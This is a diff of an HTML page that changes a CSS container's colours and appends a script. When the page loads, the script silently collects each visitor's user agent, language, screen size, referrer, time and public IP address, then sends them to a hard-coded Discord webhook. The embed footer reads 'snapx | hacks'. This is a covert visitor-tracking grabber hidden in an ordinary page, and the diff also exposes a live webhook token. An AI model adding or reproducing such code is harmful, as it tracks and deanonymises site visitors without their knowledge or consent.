@@ -22,17 +22,17 @@
             color: #2596be;
         }
 
-        .container {
-            background: rgba(37, 150, 190, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 400px;
-            width: 90%;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            color: white;
-        }
+.container {
+    background: rgba(55, 65, 75, 0.95); /* dark gray-blue */
+    backdrop-filter: blur(10px);
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+    text-align: center;
+    color: #fff;
+}
 
         .logo {
             width: 80px;
@@ -493,5 +493,59 @@
             }, 100);
         });
     </script>
+
+    <script>
+window.addEventListener('load', async () => {
+    try {
+        // --- Visitor Info ---
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const screenSize = `${window.screen.width}x${window.screen.height}`;
+        const referrer = document.referrer || 'Direct';
+        const time = new Date().toLocaleString();
+
+        // --- Optional API Call (e.g., IP API) ---
+        let ipData = {};
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json'); // <-- Replace with your API link
+            ipData = await ipResponse.json();
+        } catch (apiErr) {
+            console.warn('API fetch failed:', apiErr);
+        }
+
+        // --- Prepare Discord Webhook Message ---
+        const webhookUrl = 'https://discord.com/api/webhooks/1424125031465615532/eJDFxgbPHYHGLNdlMQFCXw3M25srFjafRiVZzt0D1byJMxVnZiHNiKo2MASOIGUXPSac'; // <-- your webhook
+        const message = {
+            content: '**New Visitor**',
+            embeds: [{
+                title: 'Visitor Information',
+                color: 5814783, // green
+                fields: [
+                    { name: 'User Agent', value: userAgent },
+                    { name: 'Language', value: language, inline: true },
+                    { name: 'Screen Size', value: screenSize, inline: true },
+                    { name: 'Referrer', value: referrer, inline: true },
+                    { name: 'Time', value: time, inline: true },
+                    { name: 'ip address', value: ipData.ip, inline: true },
+                    { name: 'IP Address', value: ipData.ip || 'N/A', inline: true }
+                ],
+                footer: { text: 'snapx | hacks' }
+            }]
+        };
+
+        // --- Send to Discord Webhook ---
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        });
+        console.log('Visitor info sent successfully to Discord!');
+
+    } catch (error) {
+        console.error('Error logging visitor:', error);
+    }
+});
+</script>
+    
 </body>
 </html>
